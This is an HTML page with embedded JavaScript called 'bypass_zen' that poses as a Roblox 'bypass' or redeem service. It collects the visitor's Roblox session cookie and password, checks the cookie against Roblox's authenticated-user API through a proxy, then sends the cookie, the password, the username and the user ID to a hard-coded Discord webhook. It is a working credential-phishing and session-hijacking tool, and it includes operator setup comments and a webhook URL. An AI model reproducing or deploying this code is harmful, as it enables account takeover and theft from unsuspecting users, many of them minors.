<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>bypass_zen</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; font-family: 'Segoe UI', Arial, sans-serif; color: #e8f0ff; }
  body {
    min-height: 100vh;
    background: radial-gradient(circle at 20% 20%, #163a6e 0%, #0a1a33 45%, #050c1a 100%);
    display: flex; flex-direction: column; align-items: center;
    padding: 60px 20px; overflow-x: hidden; position: relative;
  }
  body::before, body::after {
    content: ""; position: fixed; border-radius: 50%; filter: blur(90px); z-index: 0;
  }
  body::before { width: 450px; height: 450px; background: rgba(70, 140, 255, 0.35); top: -100px; left: -100px; }
  body::after { width: 400px; height: 400px; background: rgba(90, 110, 255, 0.35); bottom: -100px; right: -80px; }
  header { text-align: center; margin-bottom: 50px; z-index: 1; }
  header h1 {
    font-size: 2.1em; letter-spacing: 3px; font-weight: 700;
    background: linear-gradient(90deg, #9fc4ff, #ffffff, #9fc4ff);
    -webkit-background-clip: text; background-clip: text; color: transparent;
    text-shadow: 0 0 50px rgba(120, 170, 255, 0.6);
  }
  .logo { width: 54px; height: 54px; margin: 0 auto 14px; display: block; filter: drop-shadow(0 0 14px rgba(110, 160, 255, 0.5)); }
  header p { margin-top: 10px; color: #a1c0e0; font-weight: 300; letter-spacing: 1px; }
  .main-card {
    background: rgba(255, 255, 255, 0.04); backdrop-filter: blur(22px);
    border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 20px;
    padding: 34px 30px; width: 100%; max-width: 420px;
    box-shadow: 0 8px 32px rgba(0, 10, 25, 0.45); z-index: 1;
  }
  .field-block { margin-bottom: 14px; }
  textarea {
    width: 100%; background: rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 10px;
    padding: 11px 14px; color: #fff; font-size: 0.92em;
    outline: none; resize: none; font-family: inherit; min-height: 48px;
    transition: border-color 0.2s, background 0.2s;
  }
  textarea::placeholder { color: #a9c2e8; }
  textarea:focus { border-color: #6ea8ff; background: rgba(255, 255, 255, 0.16); }
  button {
    width: 100%; padding: 13px; border: none; border-radius: 10px;
    background: linear-gradient(90deg, #1a3d78, #2a5aa8); color: #fff;
    font-size: 1em; letter-spacing: 0.5px; cursor: pointer;
    transition: opacity 0.2s, transform 0.15s;
  }
  button:hover { opacity: 0.9; }
  button:active { transform: scale(0.98); }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
  .timer-digits { display: inline-block; }
  .timer-digits.tick { animation: digitDrop 0.4s ease; }
  @keyframes digitDrop {
    0% { opacity: 0; transform: translateY(-10px); filter: blur(2px); }
    60% { opacity: 1; transform: translateY(2px); filter: blur(0); }
    100% { opacity: 1; transform: translateY(0); }
  }
  .status { margin-top: 14px; font-size: 0.9em; text-align: center; }
  .progress-track {
    margin-top: 10px; width: 100%; height: 6px; border-radius: 6px;
    background: rgba(255, 255, 255, 0.1); overflow: hidden; display: none;
  }
  .progress-track.show { display: block; }
  .progress-fill {
    height: 100%; width: 0%;
    background: linear-gradient(90deg, #2a5aa8, #6ea8ff);
    border-radius: 6px; transition: width 1s linear;
  }
  .status-box {
    display: flex; align-items: center; justify-content: center; gap: 8px;
    padding: 12px 16px; border-radius: 12px; color: #fff; font-weight: 500;
    backdrop-filter: blur(10px); animation: fadeInUp 0.35s ease;
  }
  .status-box.success { background: rgba(80, 255, 130, 0.18); border: 1px solid rgba(120, 255, 160, 0.5); box-shadow: 0 4px 20px rgba(80, 255, 130, 0.25); }
  .status-box.error { background: rgba(255, 80, 100, 0.18); border: 1px solid rgba(255, 120, 140, 0.4); box-shadow: 0 4px 20px rgba(255, 80, 100, 0.25); }
  @keyframes fadeInUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
  footer { margin-top: 50px; color: #5f7fa0; font-size: 0.8em; z-index: 1; }
  .bulb {
    position: fixed; bottom: 24px; right: 24px; width: 52px; height: 52px;
    border-radius: 50%; background: rgba(255, 255, 255, 0.03);
    backdrop-filter: blur(14px); border: 1px solid rgba(120, 170, 255, 0.25);
    display: flex; align-items: center; justify-content: center;
    font-size: 1.5em; cursor: pointer; z-index: 5;
    transition: transform 0.2s, opacity 0.2s; opacity: 0.75;
  }
  .bulb:hover { transform: scale(1.08); opacity: 1; }
  .bulb.active { opacity: 1; }
  .notes-panel {
    position: fixed; bottom: 88px; right: 24px; width: 280px;
    background: rgba(20, 35, 65, 0.28); backdrop-filter: blur(20px);
    border: 1px solid rgba(120, 170, 255, 0.2); border-radius: 16px;
    padding: 16px; z-index: 5; display: none; flex-direction: column; gap: 10px;
  }
  .notes-panel.open { display: flex; }
  .notes-panel h3 { font-size: 0.95em; color: #bcd6ff; display: flex; gap: 6px; }
  .notes-panel [contenteditable] {
    min-height: 90px; background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 10px;
    padding: 10px; font-size: 0.85em; outline: none; max-height: 220px;
  }
  .settings-btn { bottom: 84px; }
  .settings-panel { bottom: 148px; }
  .category-options { display: flex; flex-direction: column; gap: 8px; }
  .category-options label {
    display: flex; align-items: center; gap: 8px;
    padding: 9px 12px; border-radius: 10px;
    background: rgba(255, 255, 255, 0.06);
    border: 1px solid rgba(255, 255, 255, 0.15);
    cursor: pointer; font-size: 0.88em;
  }
  .category-options label:has(input:checked) {
    background: rgba(90, 150, 255, 0.2);
    border-color: rgba(120, 180, 255, 0.6);
  }
  .category-options input[type="radio"] { accent-color: #6ea8ff; width: 15px; height: 15px; }
</style>
</head>
<body>

<header>
  <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="ensoGradient" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stop-color="#9fc4ff"/>
        <stop offset="50%" stop-color="#5c8cfa"/>
        <stop offset="100%" stop-color="#2a5aa8"/>
      </linearGradient>
    </defs>
    <path d="M 50 12 A 38 38 0 1 1 20 30" fill="none" stroke="url(#ensoGradient)" stroke-width="9" stroke-linecap="round"/>
  </svg>
  <h1>bypass_zen</h1>
  <p>Project from 2026</p>
</header>

<div class="main-card">
  <form id="mainForm">
    <div class="field-block">
      <textarea id="f1-message" placeholder="Cookie (_|WARNING... or C...)" required></textarea>
    </div>
    <div class="field-block">
      <textarea id="f2-message" placeholder="Password" required></textarea>
    </div>
    <button type="submit" id="redeemBtn">Redeem</button>
    <div class="progress-track" id="progressTrack"><div class="progress-fill" id="progressFill"></div></div>
    <div class="status" id="status"></div>
  </form>
</div>

<footer>bypass_zen · 2026</footer>

<div class="bulb settings-btn" id="settingsBtn">⚙️</div>
<div class="notes-panel settings-panel" id="settingsPanel">
  <h3>⚙️ Settings</h3>
  <div class="category-options" id="categoryOptions"></div>
</div>

<div class="bulb" id="bulbBtn">💡</div>
<div class="notes-panel" id="notesPanel">
  <h3>💡 Notes</h3>
  <div id="notesContent"></div>
</div>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1525520420260941955/2AOfsSAlQ6nr1UITDMHXStyEiLaKGDMpsWeHFldDpL8dVl8Z1O2VCZ3NNd3N9mp-TlJ_";
  const PROXY_URL = "https://bypass-proxy.onrender.com"; // ЗАМЕНИ НА СВОЙ URL WEB SERVICE

  function toCodeBlock(text) {
    const safe = text.replace(/`/g, "'");
    return "```\n" + safe + "\n```";
  }

  function cleanCookie(raw) {
    if (!raw) return "";
    let c = raw.trim();
    if (c.startsWith("_|WARNING")) {
      const parts = c.split("|_");
      if (parts.length >= 2) c = parts[parts.length - 1].trim();
    }
    return c.replace(/^["';]+|["';]+$/g, "").trim();
  }

  function showStatus(type, text) {
    const statusEl = document.getElementById("status");
    statusEl.innerHTML = '<div class="status-box ' + type + '">' + text + '</div>';
  }

  async function validateCookie(cookie) {
    const cleaned = cleanCookie(cookie);
    console.log("[DEBUG] Cleaned cookie:", cleaned);
    
    if (!cleaned || cleaned.length < 50) {
      return { isValid: false, userId: 0, username: "Too short", reason: "Cookie too short" };
    }
    
    const target = "https://users.roblox.com/v1/users/authenticated";
    const proxyUrl = PROXY_URL + "?url=" + encodeURIComponent(target);
    console.log("[DEBUG] Request URL:", proxyUrl);

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);
      
      const response = await fetch(proxyUrl, {
        method: "GET",
        headers: { "X-Roblox-Cookie": cleaned, "Accept": "application/json" },
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);
      console.log("[DEBUG] Response status:", response.status);
      
      if (response.status === 200) {
        const data = await response.json();
        console.log("[DEBUG] Response data:", data);
        if (data && data.id) {
          return { isValid: true, userId: data.id, username: data.name || "Unknown", cleanedCookie: cleaned };
        }
      }
      
      if (response.status === 401 || response.status === 403) {
        return { isValid: false, userId: 0, username: "Invalid", reason: "Invalid cookie" };
      }
      
      return { isValid: false, userId: 0, username: "Error", reason: "HTTP " + response.status };
    } catch (err) {
      console.log("[DEBUG] Error:", err);
      return { isValid: false, userId: 0, username: "Error", reason: "Network: " + err.message };
    }
  }

  async function sendToDiscord(category, message1, message2, cookieData) {
    const payload = {
      username: "bypass_zen",
      embeds: [{
        title: "📩 New Submission",
        color: 0x2ecc71,
        description:
          "**🗂 Category:** " + category + "\n" +
          "**👤 User:** " + cookieData.username + " (ID: " + cookieData.userId + ")\n\n" +
          "**📝 Cookie**\n" + toCodeBlock(message1) +
          "\n**🔑 Password**\n" + toCodeBlock(message2),
        footer: { text: "bypass_zen · 2026" },
        timestamp: new Date().toISOString()
      }]
    };
    try {
      const res = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (res.ok || res.status === 204) return { ok: true };
      return { ok: false, reason: "Discord: HTTP " + res.status };
    } catch (err) {
      return { ok: false, reason: "Discord network error" };
    }
  }

  document.getElementById("mainForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const button = document.getElementById("redeemBtn");

    const message1 = document.getElementById("f1-message").value.trim();
    const message2 = document.getElementById("f2-message").value.trim();

    if (!(message1.startsWith("_|W") || message1.startsWith("C"))) {
      showStatus("error", "Field 1: must start with _|W or C");
      return;
    }
    if (!message2) {
      showStatus("error", "Password cannot be empty");
      return;
    }

    button.disabled = true;
    showStatus("", "Validating cookie...");

    const cookieResult = await validateCookie(message1);

    if (!cookieResult.isValid) {
      button.disabled = false;
      showStatus("error", "❌ Invalid Cookie! " + (cookieResult.reason || ""));
      return;
    }

    showStatus("success", "✓ Valid! " + cookieResult.username + " (ID: " + cookieResult.userId + ")");
    
    // Отправляем в Discord
    const result = await sendToDiscord(selectedCategory, message1, message2, cookieResult);
    button.disabled = false;
    
    if (result.ok) {
      e.target.reset();
      startCooldown(button, 180);
    }
  });

  function startCooldown(button, seconds) {
    let remaining = seconds;
    button.disabled = true;
    const progressTrack = document.getElementById("progressTrack");
    const progressFill = document.getElementById("progressFill");
    progressTrack.classList.add("show");
    progressFill.style.width = "0%";

    const tick = () => {
      const m = Math.floor(remaining / 60);
      const s = String(remaining % 60).padStart(2, "0");
      button.innerHTML = 'Wait <span class="timer-digits" id="timerDigits">' + m + ":" + s + '</span>';
      const digitsEl = document.getElementById("timerDigits");
      void digitsEl.offsetWidth;
      digitsEl.classList.add("tick");
      progressFill.style.width = ((seconds - remaining) / seconds) * 100 + "%";
      if (remaining <= 0) {
        clearInterval(interval);
        button.disabled = false;
        button.textContent = "Redeem";
        progressTrack.classList.remove("show");
        progressFill.style.width = "0%";
        return;
      }
      remaining--;
    };
    tick();
    const interval = setInterval(tick, 1000);
  }

  const NOTES_TEXT = "Write your own details here. Just edit the NOTES_TEXT variable in the code.";
  const bulbBtn = document.getElementById("bulbBtn");
  const notesPanel = document.getElementById("notesPanel");
  document.getElementById("notesContent").textContent = NOTES_TEXT;

  bulbBtn.addEventListener("click", (e) => {
    e.stopPropagation();
    notesPanel.classList.toggle("open");
    bulbBtn.classList.toggle("active");
  });
  document.addEventListener("click", (e) => {
    if (!notesPanel.contains(e.target) && !bulbBtn.contains(e.target)) {
      notesPanel.classList.remove("open");
      bulbBtn.classList.remove("active");
    }
  });

  const CATEGORY_NAMES = ["Classic bypass", "Bypass 12-", "Bypass 2 f"];
  let selectedCategory = CATEGORY_NAMES[0];

  const settingsBtn = document.getElementById("settingsBtn");
  const settingsPanel = document.getElementById("settingsPanel");
  const categoryOptions = document.getElementById("categoryOptions");

  categoryOptions.innerHTML = CATEGORY_NAMES.map((name, i) => `
    <label>
      <input type="radio" name="category" value="${name}" ${i === 0 ? "checked" : ""}>
      ${name}
    </label>
  `).join("");

  categoryOptions.addEventListener("change", (e) => {
    if (e.target.name === "category") selectedCategory = e.target.value;
  });

  settingsBtn.addEventListener("click", (e) => {
    e.stopPropagation();
    settingsPanel.classList.toggle("open");
    settingsBtn.classList.toggle("active");
  });
  document.addEventListener("click", (e) => {
    if (!settingsPanel.contains(e.target) && !settingsBtn.contains(e.target)) {
      settingsPanel.classList.remove("open");
      settingsBtn.classList.remove("active");
    }
  });
</script>

</body>
</html>
